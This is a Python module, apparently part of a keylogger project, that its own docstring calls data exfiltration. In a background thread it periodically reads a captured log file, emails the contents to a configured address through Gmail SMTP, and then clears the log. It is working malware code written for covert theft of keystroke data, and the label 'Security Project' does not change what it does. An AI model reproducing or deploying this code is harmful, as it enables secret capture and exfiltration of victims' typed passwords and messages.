"""
Module: Network Communications
Description: Handles data exfiltration using the SMTP protocol to send log files via email.
"""

import smtplib
import ssl
import time
import threading
import config
from email.mime.text import MIMEText

class EmailSender:
    def __init__(self):
        """Initializes credentials and timing from the config module."""
        self.sender = config.SENDER_EMAIL
        self.password = config.EMAIL_PASSWORD
        self.receiver = config.RECEIVER_EMAIL
        self.interval = config.SEND_REPORT_EVERY
        self.log_file = config.LOG_FILE

    def send_mail(self):
        """Connects to the SMTP server and sends the log file content."""
        try:
            #utf-8 encoding: for future support of all languages
            with open(self.log_file, "r", encoding="utf-8") as file:
                log_content = file.read()
            
            if not log_content:
                return # Do not send empty emails

            # Email object 
            msg = MIMEText(log_content, 'plain', 'utf-8')
            msg['Subject'] = 'Security Project Log Update'
            msg['From'] = self.sender
            msg['To'] = self.receiver
            
            context = ssl.create_default_context()
            
            # Send email
            with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
                server.login(self.sender, self.password)
                server.sendmail(self.sender, self.receiver, msg.as_string())
            
            # Clear the log file after successful sending
            with open(self.log_file, "w", encoding="utf-8") as file:
                file.write("")
                
        except Exception as e:
            print(f"Error sending email: {e}")

    def start(self):
        """Runs the email sender in a continuous loop on a background thread."""
        def timer_loop():
            while True:
                time.sleep(self.interval)
                self.send_mail()
        
        #Thread needed for sending while listening to keyboard
        timer_thread = threading.Thread(target=timer_loop, daemon=True)
        timer_thread.start()